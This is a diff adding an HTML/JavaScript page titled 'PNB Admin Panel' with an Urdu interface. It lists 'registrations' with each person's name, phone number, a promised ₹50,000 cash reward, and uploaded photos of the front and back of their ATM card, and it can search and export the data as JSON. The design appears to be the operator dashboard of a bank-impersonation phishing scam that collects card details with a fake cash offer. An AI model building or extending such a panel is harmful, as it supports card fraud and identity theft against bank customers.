@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="ur">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PNB Admin Panel</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+  body { background: #f0f2f5; }
+
+  .header {
+    background: linear-gradient(90deg, #6a0d83, #a020a0);
+    color: white; padding: 15px 20px;
+    display: flex; align-items: center; justify-content: space-between;
+    position: sticky; top: 0; z-index: 100;
+  }
+  .header h1 { font-size: 18px; }
+  .logo { font-weight: bold; font-size: 18px; }
+
+  .stats {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+    gap: 12px;
+    max-width: 1100px;
+    margin: 20px auto;
+    padding: 0 15px;
+  }
+  .stat-card {
+    background: white;
+    padding: 18px;
+    border-radius: 8px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    text-align: center;
+    border-left: 4px solid #6a0d83;
+  }
+  .stat-card .num {
+    font-size: 26px;
+    font-weight: bold;
+    color: #6a0d83;
+  }
+  .stat-card .lbl {
+    font-size: 13px;
+    color: #666;
+    margin-top: 5px;
+  }
+
+  .toolbar {
+    max-width: 1100px;
+    margin: 0 auto 15px;
+    padding: 0 15px;
+    display: flex;
+    gap: 10px;
+    flex-wrap: wrap;
+  }
+  .toolbar input {
+    flex: 1;
+    min-width: 180px;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    font-size: 14px;
+  }
+  .toolbar button {
+    padding: 10px 18px;
+    border: none;
+    border-radius: 4px;
+    font-size: 14px;
+    cursor: pointer;
+    font-weight: bold;
+    color: white;
+  }
+  .btn-refresh { background: #6a0d83; }
+  .btn-export { background: #28a745; }
+  .btn-clear { background: #dc3545; }
+  .toolbar button:active { opacity: 0.8; }
+
+  .container {
+    max-width: 1100px;
+    margin: 0 auto 40px;
+    padding: 0 15px;
+  }
+
+  .user-card {
+    background: white;
+    border-radius: 8px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    margin-bottom: 15px;
+    overflow: hidden;
+    border-left: 5px solid #a020a0;
+  }
+  .user-head {
+    padding: 15px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    cursor: pointer;
+    background: #faf5ff;
+  }
+  .user-head:hover { background: #f3e8ff; }
+  .user-info h3 {
+    font-size: 16px;
+    color: #333;
+    margin-bottom: 4px;
+  }
+  .user-info p {
+    font-size: 13px;
+    color: #666;
+  }
+  .user-cash {
+    background: linear-gradient(90deg, #ff6b00, #ff0040);
+    color: white;
+    padding: 6px 14px;
+    border-radius: 20px;
+    font-size: 13px;
+    font-weight: bold;
+    white-space: nowrap;
+  }
+
+  .user-body {
+    display: none;
+    padding: 15px;
+    border-top: 1px solid #eee;
+  }
+  .user-body.active { display: block; }
+
+  .detail-row {
+    display: flex;
+    justify-content: space-between;
+    padding: 8px 0;
+    border-bottom: 1px solid #f0f0f0;
+    font-size: 14px;
+  }
+  .detail-row:last-child { border-bottom: none; }
+  .detail-row .key { color: #888; font-weight: bold; }
+  .detail-row .val { color: #333; text-align: right; word-break: break-all; }
+
+  .imgs {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-top: 12px;
+  }
+  .img-box {
+    text-align: center;
+  }
+  .img-box p {
+    font-size: 13px;
+    color: #666;
+    margin-bottom: 6px;
+    font-weight: bold;
+  }
+  .img-box img {
+    width: 100%;
+    border-radius: 6px;
+    border: 2px solid #ddd;
+    cursor: pointer;
+  }
+
+  .empty {
+    text-align: center;
+    padding: 60px 20px;
+    color: #888;
+    background: white;
+    border-radius: 8px;
+    font-size: 16px;
+  }
+  .empty .emoji { font-size: 50px; display: block; margin-bottom: 15px; }
+
+  /* Image Preview Modal */
+  .img-modal {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0,0,0,0.9);
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    padding: 20px;
+  }
+  .img-modal.active { display: flex; }
+  .img-modal img {
+    max-width: 100%;
+    max-height: 90vh;
+    border-radius: 8px;
+  }
+  .img-modal .close-btn {
+    position: absolute;
+    top: 15px; right: 20px;
+    color: white;
+    font-size: 32px;
+    cursor: pointer;
+    font-weight: bold;
+  }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">🔐 PNB Admin</div>
+  <h1>Registration Dashboard</h1>
+</div>
+
+<!-- Stats -->
+<div class="stats">
+  <div class="stat-card">
+    <div class="num" id="totalUsers">0</div>
+    <div class="lbl">کل صارفین</div>
+  </div>
+  <div class="stat-card">
+    <div class="num" id="totalCash">₹0</div>
+    <div class="lbl">کل کیش (₹50,000 ×)</div>
+  </div>
+  <div class="stat-card">
+    <div class="num" id="todayUsers">0</div>
+    <div class="lbl">آج کی رجسٹریشن</div>
+  </div>
+</div>
+
+<!-- Toolbar -->
+<div class="toolbar">
+  <input type="text" id="searchBox" placeholder="🔍 نام یا فون سے تلاش کریں..." oninput="renderUsers()">
+  <button class="btn-refresh" onclick="renderUsers()">🔄 Refresh</button>
+  <button class="btn-export" onclick="exportData()">⬇️ Export JSON</button>
+  <button class="btn-clear" onclick="clearAll()">🗑️ Clear All</button>
+</div>
+
+<!-- Users -->
+<div class="container" id="usersContainer"></div>
+
+<!-- Image Preview -->
+<div class="img-modal" id="imgModal" onclick="closeImgModal()">
+  <span class="close-btn">&times;</span>
+  <img id="previewImg" src="" alt="Preview">
+</div>
+
+<script>
+function getUsers() {
+  try {
+    return JSON.parse(localStorage.getItem('pnbUsers') || '[]');
+  } catch (e) { return []; }
+}
+
+function renderUsers() {
+  var users = getUsers();
+  var search = (document.getElementById('searchBox').value || '').toLowerCase().trim();
+  var container = document.getElementById('usersContainer');
+
+  // Stats
+  document.getElementById('totalUsers').textContent = users.length;
+  document.getElementById('totalCash').textContent = '₹' + (users.length * 50000).toLocaleString('en-IN');
+
+  var today = new Date().toLocaleDateString();
+  var todayCount = users.filter(function(u) {
+    return u.time && u.time.split(',')[0] === today;
+  }).length;
+  document.getElementById('todayUsers').textContent = todayCount;
+
+  // Filter
+  var filtered = users.filter(function(u) {
+    if (!search) return true;
+    return (u.name || '').toLowerCase().indexOf(search) > -1 ||
+           (u.phone || '').toLowerCase().indexOf(search) > -1;
+  });
+
+  if (filtered.length === 0) {
+    container.innerHTML = '<div class="empty"><span class="emoji">📭</span>' +
+      (users.length === 0 ? 'ابھی تک کوئی رجسٹریشن نہیں ہوئی' : 'کوئی نتیجہ نہیں ملا') +
+      '</div>';
+    return;
+  }
+
+  // Reverse: newest first
+  filtered = filtered.slice().reverse();
+
+  var html = '';
+  filtered.forEach(function(u, i) {
+    var idx = users.indexOf(u);
+    html += '<div class="user-card">' +
+      '<div class="user-head" onclick="toggleBody(' + idx + ')">' +
+        '<div class="user-info">' +
+          '<h3>👤 ' + escapeHtml(u.name || 'N/A') + '</h3>' +
+          '<p>📞 ' + escapeHtml(u.phone || 'N/A') + ' &nbsp;|&nbsp; 🕒 ' + escapeHtml(u.time || '') + '</p>' +
+        '</div>' +
+        '<div class="user-cash">₹' + (u.cash || 50000).toLocaleString('en-IN') + '</div>' +
+      '</div>' +
+      '<div class="user-body" id="body-' + idx + '">' +
+        '<div class="detail-row"><span class="key">نام:</span><span class="val">' + escapeHtml(u.name) + '</span></div>' +
+        '<div class="detail-row"><span class="key">فون:</span><span class="val">' + escapeHtml(u.phone) + '</span></div>' +
+        '<div class="detail-row"><span class="key">کیش:</span><span class="val">₹' + (u.cash || 50000).toLocaleString('en-IN') + '</span></div>' +
+        '<div class="detail-row"><span class="key">وقت:</span><span class="val">' + escapeHtml(u.time) + '</span></div>' +
+        '<div class="imgs">' +
+          '<div class="img-box"><p>💳 ATM Front</p>' +
+            (u.frontImg ? '<img src="' + u.frontImg + '" onclick="openImg(this.src)">' : '<p style="color:#bbb;">کوئی تصویر نہیں</p>') +
+          '</div>' +
+          '<div class="img-box"><p>💳 ATM Back</p>' +
+            (u.backImg ? '<img src="' + u.backImg + '" onclick="openImg(this.src)">' : '<p style="color:#bbb;">کوئی تصویر نہیں</p>') +
+          '</div>' +
+        '</div>' +
+      '</div>' +
+    '</div>';
+  });
+
+  container.innerHTML = html;
+}
+
+function toggleBody(idx) {
+  var el = document.getElementById('body-' + idx);
+  if (el) el.classList.toggle('active');
+}
+
+function openImg(src) {
+  document.getElementById('previewImg').src = src;
+  document.getElementById('imgModal').classList.add('active');
+}
+function closeImgModal() {
+  document.getElementById('imgModal').classList.remove('active');
+}
+
+function exportData() {
+  var users = getUsers();
+  if (users.length === 0) { alert('کوئی ڈیٹا نہیں ہے'); return; }
+  var blob = new Blob([JSON.stringify(users, null, 2)], { type: 'application/json' });
+  var url = URL.createObjectURL(blob);
+  var a = document.createElement('a');
+  a.href = url;
+  a.download = 'pnb_users_' + Date.now() + '.json';
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+function clearAll() {
+  if (confirm('⚠️ کیا آپ واقعی تمام ڈیٹا حذف کرنا چاہتے ہیں؟ یہ واپس نہیں ہوگا۔')) {
+    localStorage.removeItem('pnbUsers');
+    renderUsers();
+  }
+}
+
+function escapeHtml(str) {
+  if (!str) return '';
+  return String(str).replace(/[&<>"']/g, function(m) {
+    return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m];
+  });
+}
+
+// Init
+renderUsers();
+</script>
+
+</body>
+</html>
